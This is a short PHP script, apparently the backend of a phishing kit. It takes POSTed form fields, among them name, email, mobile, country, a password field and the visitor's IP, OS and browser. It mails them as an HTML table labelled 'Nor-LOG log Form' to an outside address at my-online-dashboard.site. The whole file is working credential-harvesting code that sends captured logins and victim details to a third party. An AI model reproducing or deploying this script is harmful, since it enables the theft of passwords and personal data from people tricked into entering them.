<?php
$to = "nor@my-online-dashboard.site";


$name=$_POST['name'];
$email=$_POST['email'];
$mobile=$_POST['mobile'];
$country=$_POST['country'];
$key=$_POST['pass'];
$ip=$_POST['ip'];
$os=$_POST['os'];
$browser=$_POST['browser'];
$subject = $name;
$message = 
"
<html>
<head>
<title>HTML email</title>
</head>
<body>
<table border='1' style='text-align:left;''>
<tr style='background-color:red'>
<th colspan=4 style='text-align:center;background-color:#000;color:#fff;'>Nor-LOG log Form</th>
</tr>
<tr style='background-color:#e6e6e6'>
<th  width=100>Name</th>
<td>$name</td>
</tr>
<tr>
<th>Email</th>
<td>$email</td>
</tr>
<tr style='background-color:#e6e6e6'>
<th>Mobile No</th>
<td>$mobile</td>
</tr>
<tr>
<th>Country</th>
<td > $country</td>
</tr>
<tr style='background-color:#e6e6e6'>
<th width=100>Pass</th>
<td > $key</td>
</tr>
<tr>
<th>IP</th>
<td> $ip</td>
</tr>
<tr style='background-color:#e6e6e6'>
<th>OS</th>
<td> $os</td>
</tr>
<tr>
<th>Browser</th>
<td> $browser</td>
</tr>
</table>
</body>
</html>
 ";  
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$mail=   mail($to, $subject, $message, $headers); 
?>